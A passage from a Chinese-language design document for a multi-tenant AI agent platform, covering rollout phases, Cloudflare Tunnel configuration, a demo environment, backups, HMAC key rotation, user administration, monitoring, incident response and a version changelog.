8. (4h) 反代核心:path 匹配 + ACL + §1.2 签名 + httpx.stream + StreamingResponse + 断开传播;§3.1 净化;§3.2 keepalive
9. (2h) §7.1 全套响应头 + 请求级 nonce;§7.2 防火墙(Sec-Fetch-Mode + Referer 路径 + CSRF double-submit)
10. (1h) 缓存(§7.3)+ healthz 探测后台任务
11. (1h) cloudflared `config.yml`:`app.fiveoranges.ai` 和 `api.fiveoranges.ai` 双 hostname → `platform-app:80`
12. (3h) 端到端 smoke(curl `/healthz` → 浏览器登录 → 点 agent → 一条小消息「你好」<¥0.10 成本)
13. (1.5h) 备份 cron + log rotation + colima launchd plist
14. (1h) 给许总试用(用手机蜂窝验证 CF 路径)

**CF Tunnel `config.yml` 示例**:

```yaml
tunnel: <tunnel-id>
credentials-file: /etc/cloudflared/<tunnel-id>.json
ingress:
  - hostname: app.fiveoranges.ai
    service: http://platform-app:80
  - hostname: api.fiveoranges.ai
    service: http://platform-app:80
  - service: http_status:404
```

### 12.2 阶段 2:Demo 环境上线(在客户 #2 之前)

**为什么先 demo,后客户 #2**:demo 是 `fiveoranges.ai/demo` 的 CTA,是签客户 #2 的销售工具;demo 也排练了「平台能起两个独立实例」这个能力。

```
fiveoranges.ai/demo                          ← Vercel 主站 CTA
   │
   └─ → demo.fiveoranges.ai/yinhu-demo/super-xiaochen
              │
              └─ (CF Tunnel) → Mac mini → platform-demo 容器(独立!)
                                            │
                                            └─→ agent-yinhu-demo 容器(脱敏数据)
```

实现项:
- [ ] CF Tunnel 加第三个 public hostname:`demo.fiveoranges.ai` → `platform-demo:80`
- [ ] 起 platform-demo 容器(同代码,独立 DB,启用 guest mode)
- [ ] guest 自动登录:`POST /auth/guest`(demo 子域专属;返回 1h session)
- [ ] platform-demo DB 注册 `(yinhu-demo, super-xiaochen)`,visibility=`demo`
- [ ] agent-yinhu-demo 容器:复制镜像 + 替换数据卷为脱敏 fixture
- [ ] cron 每天 3am 重置数据
- [ ] 强制 rate limit:100 query/h/IP
- [ ] 主站 fiveoranges.ai 加 `/products/super-xiaochen` 介绍页 + `/cases/yinhu` 案例(脱敏)+ `/demo` CTA

### 12.3 阶段 3:第二家客户接入

- yunwei-kernel 跑完 → 产物 cp 到 `~/agent-platform/tenants/<新客户>/`
- 改造 web 入口加 §1.2 中间件(同 §10 checklist)
- platform-app DB 加行 + 用户授权
- `docker compose up -d agent-<新客户>-<agent>`
- **0 改动 platform 代码**

### 12.4 阶段 4:出现敏感客户 → 切混合部署
走 §11 流程。

---

## 13. 操作手册

### 13.1 备份与恢复

- **platform sqlite**:每晚 02:00 cron `sqlite3 platform.db ".backup /backups/$(date +%Y%m%d).db"` → rclone 加密上传 B2 或阿里云 OSS;保留 30 天 + 每月 1 份永久
- **proxy_log sqlite**:90 天滚动归档为 JSONL.gz
- **恢复演练**:每季度做一次,从 backup 起容器 + 校验关键数据
- **agent 数据卷**:每客户自管(集中部署)/ 客户自管(混合部署)

### 13.2 HMAC 密钥轮换 SOP

```
1. ./platform-admin rotate-tenant-key yinhu super-xiaochen
   → 生成新 secret + key_id,写 hmac_secret_current(新)+ hmac_secret_prev(旧)
   → 输出加密包(给混合部署客户)

2. 混合部署:加密渠道发给客户;客户更新 .env (CURRENT/PREV 双值);docker compose restart agent

3. 集中部署:./platform-admin sync-tenant-env yinhu super-xiaochen
   → 平台更新对应 docker-compose env;docker compose up -d agent-yinhu-super-xiaochen

4. T+24h 后:./platform-admin clear-prev-key yinhu super-xiaochen
   → hmac_secret_prev = ''
   → 客户更新 .env 清 PREV 后 restart
```

### 13.3 用户管理

```
./platform-admin add-user <username> <display_name>     → 提示输入密码,bcrypt 存
./platform-admin grant <username> <client> <agent> [role]
./platform-admin revoke <username> <client> <agent>
./platform-admin list-users
./platform-admin reset-password <username>
```

所有操作写 audit log。

### 13.4 监控

- `/metrics` Prometheus 端点,admin 鉴权;暴露:active_sessions、proxy_requests_total、proxy_duration_seconds、tenant_health、login_failures_total
- 每个 tenant `health` 状态变化 → 推飞书机器人(可选)

### 13.5 incident 响应

- agent 容器崩 → `restart: unless-stopped` 自动拉起;3 次内重启失败 → tenants.health = 'unhealthy' → /api/agents 标灰
- platform-app 崩 → 用户已登录的 cookie 仍在,重启后无感(session 在 DB);**SSE 在跑的连接会断**,需要 v1.3 蓝绿部署解决
- DB 文件损坏 → 从 backup 恢复;**风险**:hmac_secret 倒回旧值,与当前 agent .env 可能不一致 → 需要协调一次集体轮换

### 13.6 deploy 窗口

- 路径同源决定**任何 platform 部署都会断 SSE**;在低峰期(国内深夜)滚 platform-app
- agent 容器 deploy:`docker compose up -d agent-<x>` 只断该 tenant,其他不受影响

---

## 附录:不在 v1.2 范围

- MFA(TOTP)— v1.3 必加,在 platform login + `/v1/auth/exchange` 启用
- API token 细到 endpoint 级 scope
- agent 间 server-to-server 互调
- OIDC 接入飞书 / 钉钉
- 用户自助注册
- WASM agent 白名单(`tenants.csp_overrides`)
- agent 灰度版本路由(per-user 路由到不同 agent 镜像)
- 蓝绿/金丝雀 platform 部署
- 多区域

---

## 更改记录

| 版本 | 日期 | 关键变化 |
|---|---|---|
| v1.0 | 2026-04-29 上午 | 初版,子域名 + JWT |
| v1.1 | 2026-04-29 下午 | 路径同源 + Header 注入;新增混合部署、CSP、demo 物理隔离 |
| v1.2 | 2026-04-29 晚 | review agent 反馈整合:签名 payload 完整化(method/host/path/role/body-hash)+ Key-Id 轮换;新增 §3.1 响应头净化;新增 §7.2 跨 agent 防火墙 + CSRF double-submit;§7.1 CSP 收紧(strict-dynamic + Trusted Types + COOP/CORP);nonce 强制;§7.3 缓存策略;tenants 表加 health/agent_version/tenant_uid/hmac_prev;阶段顺序换(demo 先于客户 #2);新增 §13 操作手册;时间表诚实化(8-11 天) |
